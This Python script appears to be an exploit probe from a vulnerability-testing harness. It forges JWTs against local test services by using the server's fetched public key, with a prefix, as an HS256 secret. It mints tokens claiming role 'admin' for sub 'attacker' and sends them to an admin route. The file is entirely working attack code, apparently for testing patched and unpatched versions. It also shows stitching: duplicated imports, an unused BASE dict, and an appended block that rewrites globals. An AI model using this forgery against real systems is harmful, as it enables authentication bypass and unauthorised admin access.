#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {'v0': 'http://127.0.0.1:1', 'v1': 'http://127.0.0.1:2'}
import hashlib
import hmac
import json
import os
import base64
import urllib.request
HOST = os.environ.get("PCB_HOST", "127.0.0.1")
PORTS = {"v0": 18230, "v1": 18231}
def run_probe(candidate, version: str = "v1"):
    
    if isinstance(candidate, dict):
        prefix = candidate.get("secret_prefix", "")
        route = candidate.get("route", "admin")
    else:
        prefix = getattr(candidate, "secret_prefix", "")
        route = getattr(candidate, "route", "admin")
    pub = fetch_pubkey(version)
    secret = (prefix + pub).encode("utf-8")
    token = forge_hs256(secret, {"sub": "attacker", "role": "admin"})
    return _admin(version, route, token)
def fetch_pubkey(version: str) -> str:
    _, body = _get(f"{_base(version)}/pubkey")
    return body
def forge_hs256(secret: bytes, payload: dict) -> str:
    
    header = {"alg": "HS256", "typ": "JWT"}
    signing_input = (
        _b64url(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + _b64url(json.dumps(payload, separators=(",", ":")).encode())
    )
    sig = hmac.new(secret, signing_input.encode("ascii"), hashlib.sha256).digest()
    return signing_input + "." + _b64url(sig)
def _admin(version: str, route: str, token: str):
    code, body = _get(f"{_base(version)}/{route}", headers={"Authorization": f"Bearer {token}"})
    return {"version": version, "route": route, "status": code, "body": body}
def _get(url: str, headers: dict | None = None, timeout: float = 8.0):
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  
        return 0, f"__error__ {e}"
def _base(version: str) -> str:
    return f"http://{HOST}:{PORTS[version]}"
def _b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))